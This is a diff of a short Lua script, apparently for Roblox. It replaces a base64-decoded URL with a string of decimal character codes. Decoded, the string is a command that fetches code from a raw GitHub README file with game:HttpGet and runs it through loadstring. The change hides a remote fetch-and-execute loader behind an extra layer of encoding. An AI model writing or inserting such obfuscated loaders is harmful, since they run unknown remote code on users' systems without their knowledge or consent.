@@ -1,20 +1,7 @@
-local b="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nvb2xraWR2aWV0bmFtL01haG9hdG9uZ2hvcC9yZWZzL2hlYWRzL21haW4vUkVBRE1FLm1k"
-local alph="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-local function dec(s)
-  s = s:gsub("[^%w%+%/=]","")
-  return (s:gsub(".", function(c)
-    if c=="=" then return "" end
-    local i = alph:find(c)-1
-    local out = ""
-    for j=6,1,-1 do out = out .. ((i % 2^j >= 2^(j-1)) and "1" or "0") end
-    return out
-  end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(byte)
-    if #byte ~= 8 then return "" end
-    local n=0
-    for i=1,8 do n = n*2 + (byte:sub(i,i) == "1" and 1 or 0) end
-    return string.char(n)
-  end))
+local enc = "/108/111/97/100/115/116/114/105/110/103/40/103/97/109/101/58/72/116/116/112/71/101/116/40/34/104/116/116/112/115/58/47/47/114/97/119/46/103/105/116/104/117/98/117/115/101/114/99/111/110/116/101/110/116/46/99/111/109/47/99/111/111/108/107/105/100/107/118/105/101/116/110/97/109/47/77/97/104/111/97/116/111/110/103/104/111/112/47/114/101/102/115/47/104/101/97/100/115/47/109/97/105/110/47/82/69/65/68/77/69/46/109/100/34/41/41/40/41"
+local t = {}
+for n in enc:gmatch("/(%d+)") do
+    t[#t+1] = string.char(tonumber(n))
 end
-
-local url = dec(b)
-loadstring(game:HttpGet(url))()
+local code = table.concat(t)
+loadstring(code)()
